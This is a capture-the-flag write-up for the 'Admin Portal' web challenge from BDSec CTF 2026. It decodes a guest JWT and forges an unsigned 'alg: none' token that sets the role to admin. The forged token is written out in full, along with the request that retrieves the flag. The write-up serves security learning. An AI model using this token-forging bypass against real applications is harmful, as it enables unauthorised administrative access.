# Writeup: Admin Portal (BDSec CTF 2026)

This document provides a detailed walkthrough of the steps taken to solve the **Admin Portal** challenge (500 Points) by badhacker0x1.

---

## 1. Challenge Details & Scouting

* **Target URL**: `http://66.228.54.80:8989`
* **Category**: Web
* **Difficulty**: Easy / Intermediate

### Initial Inspection
We first inspect the login form and authenticate using the default "guest" credentials provided by the interface:
* **Username**: `guest`

Upon successfully logging in, we are redirected to `/dashboard`. Inspecting the cookies set during the redirection reveals a `session` cookie holding a JSON Web Token (JWT):
```
session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9.FrGxig8JSYGSQU7DWTl4wUwMNV782oxV6uPehibrlpc
```

---

## 2. JWT Analysis

Decoding the three sections of the JWT:
1. **Header**:
   ```json
   {"alg":"HS256","typ":"JWT"}
   ```
2. **Payload**:
   ```json
   {"user":"guest","role":"user"}
   ```
3. **Signature**:
   ```
   HMAC-SHA256 signature signed with an unknown secret key.
   ```

To gain access to `/admin`, we need to change `"role": "user"` to `"role": "admin"`. Since the signature verification key is unknown, we test for the common **Algorithm "None"** vulnerability.

---

## 3. Exploit: Algorithm "None" Bypass

If the server-side JWT verification library is vulnerable to the algorithm `"none"` attack, we can forge a token with no signature.

1. **Header (Modified)**:
   ```json
   {"alg":"none","typ":"JWT"}
   ```
   * Base64url encoding: `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0`

2. **Payload (Modified)**:
   ```json
   {"user":"guest","role":"admin"}
   ```
   * Base64url encoding: `eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoiYWRtaW4ifQ`

3. **Signature**:
   * Empty signature.

4. **Forged Session Token**:
   ```
   eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoiYWRtaW4ifQ.
   ```

Using the Burp repeater we send a GET request to `/admin` with this session token.



---

## 4. Flag Retrieval

The server accepts the unsigned `"none"` algorithm token and grants administrative access, printing the flag inside the page:



* **Flag**: **`bdsec{n0ne_4lg_m34ns_n0_s1gn4tur3}`**
